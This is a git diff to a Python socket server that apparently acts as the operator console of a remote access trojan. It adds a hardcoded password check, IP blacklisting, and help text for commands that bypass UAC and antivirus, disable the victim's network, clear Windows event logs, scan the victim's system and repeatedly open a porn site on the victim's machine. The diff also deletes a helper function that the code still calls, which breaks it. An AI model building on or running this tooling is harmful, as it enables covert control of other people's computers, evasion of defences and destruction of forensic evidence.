@@ -5,23 +5,24 @@ import shutil
 import secrets
 import string
 
+from mods.JancoAPI import * 
+
+
 clients = {}
 client_id_counter = 1
 message_directory = 'client_messages'
 archived_directory = 'archived_messages'
+blacklist = []
 
+
+# Make the big data mountains
 if not os.path.exists(message_directory):
     os.makedirs(message_directory)
 
 if not os.path.exists(archived_directory):
     os.makedirs(archived_directory)
 
-def has_less_than(var, num_chars):
-    """Check if the variable has fewer than num_chars characters."""
-    if isinstance(var, str):
-        return len(var) < num_chars
-    else:
-        return False  # Handle cases where var is not a string
+
 
 class ClientHandler(threading.Thread):
     def __init__(self, client_socket, client_id, addr):
@@ -35,6 +36,13 @@ class ClientHandler(threading.Thread):
     def run(self):
         print(f"Client {self.client_id} connected from {self.addr}")
         self.client_socket.send(f"Your client ID is {self.client_id}".encode('ascii'))
+        first_message = self.client_socket.recv(1024).decode('ascii')
+        if first_message != "Riot":
+            print(f"Client {self.client_id} disconnected due to auth error")
+            self.blacklist_ip()
+            self.client_socket.close()
+            del clients[self.client_id]
+            return
         with open(self.message_file, 'a') as file:
             file.write(f"Client {self.client_id} connected from {self.addr}\n")
         while self.running:
@@ -42,7 +50,7 @@ class ClientHandler(threading.Thread):
                 message = self.client_socket.recv(1024).decode('ascii')
                 if not message:
                     break
-                if has_less_than(message, 100):
+                if has_less_than(message, 1000):
                     print(f"Client {self.client_id}: {message}")
                 else:
                     print(f"Massive data recieved from {self.client_id} check history for details")
@@ -67,6 +75,11 @@ class ClientHandler(threading.Thread):
         shutil.move(self.message_file, new_path)
         print(f"Archived message file for Client {self.client_id} to {new_path}")
 
+    def blacklist_ip(self):
+        blacklist.append(self.addr[0])
+        print(f"IP {self.addr[0]} blacklisted")
+
+
 class Server:
     def __init__(self, host='127.0.0.1', port=12345):
         self.host = host
@@ -86,12 +99,16 @@ class Server:
         global clients
         while True:
             client_socket, addr = self.server_socket.accept()
+            if addr[0] in blacklist:
+                client_socket.close()
+                continue
             client_id = self.client_id_counter
             clients[client_id] = client_socket
             client_handler = ClientHandler(client_socket, client_id, addr)
             client_handler.start()
             self.client_id_counter += 1
-
+            
+    # Server side commands, client side commands are handled client side
     def command_interface(self):
         while True:
             if self.selected_client_id is not None:
@@ -103,8 +120,21 @@ class Server:
                 self.list_clients()
             elif command == "select":
                 self.select_client()
-            elif command == "send":
-                self.send_message()
+            elif command == "Scan":
+                print("Please spesify arguments")
+                print("Args: deap , light")
+                print("Example:")
+                print("Scan deap")
+            elif command == "Disable":
+                print("Please spesify arguments")
+                print("Args: Network")
+                print("Example:")
+                print("Disable Network") 
+            elif command == "Bypass":
+                print("Please spesify arguments")
+                print("Args: UAC , AV , ALL")
+                print("Example:")
+                print("Bypass UAC") 
             elif command == "stop":
                 self.stop_client()
             elif command == "deselect":
@@ -153,6 +183,7 @@ class Server:
             self.send_message_to_client(self.selected_client_id, message)
         else:
             print("No client selected")
+
 
     def stop_client(self):
         if self.selected_client_id is not None:
@@ -207,6 +238,7 @@ class Server:
 
     def show_help(self):
         help_text = """
+        
 Available commands:
   list          - List all connected clients
   select        - Select a client by ID
@@ -215,9 +247,21 @@ Available commands:
   show          - Show message history of all clients
   help          - Show this help message
   exit          - Exit the server
+  Troll         - Opens pornhub over and over on client's machine
+  Scan          - Scans the system for info of client E.G "Scan deap"
+  Disable       - Disables something on client machine , avaliabe args: Network
+  Bypass        - Bypasses something on client machine , avaliabe args: UAC, AV, ALL
+  Clear Logs    - Clears windows event logs
+  cls           - Clears screan
+  debug         - Enables debugging mode
+  Uninstall     - Uninstalls the client , WARNING: DO NOT USE THIS ON ALL CLIENTS
+  
 """
         print(help_text)
 
+
+# Start the symphony played by the orchestra
 if __name__ == "__main__":
     server = Server()
     server.start()
+
